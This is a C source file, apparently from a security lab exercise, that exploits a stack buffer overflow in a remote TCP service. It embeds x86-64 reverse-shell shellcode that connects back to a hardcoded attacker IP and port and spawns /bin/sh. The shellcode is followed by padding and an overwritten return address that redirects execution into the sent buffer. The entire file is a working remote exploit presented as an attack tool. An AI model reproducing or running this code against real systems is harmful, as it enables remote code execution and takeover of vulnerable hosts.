#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define CMD_SIZE 256
#define EXPLOIT_SIZE 118

#define MY_IP "129.104.230.171"
#define MY_PORT 5555

#define IP "192.168.56.103"
#define PORT 4321
#define BUF_SIZE 2048

int command_injector(int *socket_fd, struct sockaddr_in *adress, int offset){
	
	char cmd[CMD_SIZE]=
	"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
	"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
	"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
	"\x02\x41\x41\xc7\x44\x24\x04\x41\x41\x41\x41\x48\x89\xe6\x6a\x10"
	"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
	"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
	"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
	"\x5f\x6a\x3b\x58\x0f\x05";

	//Reading IP and PORT and converting them in the cmd buffer
	int a,b,c,d;
	sscanf(MY_IP, "%d.%d.%d.%d", &a, &b, &c, &d);

	*(cmd+55) = (char) a;
	*(cmd+56) = (char) b;
	*(cmd+57) = (char) c;
	*(cmd+58) = (char) d;

	*(cmd+49) = (char) (MY_PORT/256);
	*(cmd+50) = (char) (MY_PORT%256);
	
	
	memset(cmd+EXPLOIT_SIZE, 0x41, offset); //offset the return adress to overwrite the %rip buffer

	strncpy(cmd+EXPLOIT_SIZE+offset, "\xf0\xe5\xff\xff\xff\x7f\x00", 7); //add address of buffer "buf" + NULL-byte ending

	send(*socket_fd, cmd, CMD_SIZE, 0);

	char buf[BUF_SIZE];
	recv(*socket_fd, buf, BUF_SIZE, 0);
	
	printf("buffer is : %s\n", buf);
	return 0;
}



int main(){
	struct sockaddr_in serv_address;
	serv_address.sin_family = AF_INET;
	serv_address.sin_port = htons(PORT);
	serv_address.sin_addr.s_addr = inet_addr(IP);

	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if(socket_fd == -1){
		printf("Error creating socket\n");
		return 1;
	}

	if(connect(socket_fd, (struct sockaddr *)&serv_address, sizeof(struct sockaddr_in)) != 0){
		printf("Error connecting to server on first try\n");
		return 2;
	}

	char buf[BUF_SIZE];
	recv(socket_fd, buf, BUF_SIZE, 0); //Receive memory adresses of buf and greeting_text, were they to change

	printf("%s\n", buf);

	int offset = 22;
	command_injector(&socket_fd, &serv_address, offset);

	close(socket_fd);
	return 0;
}
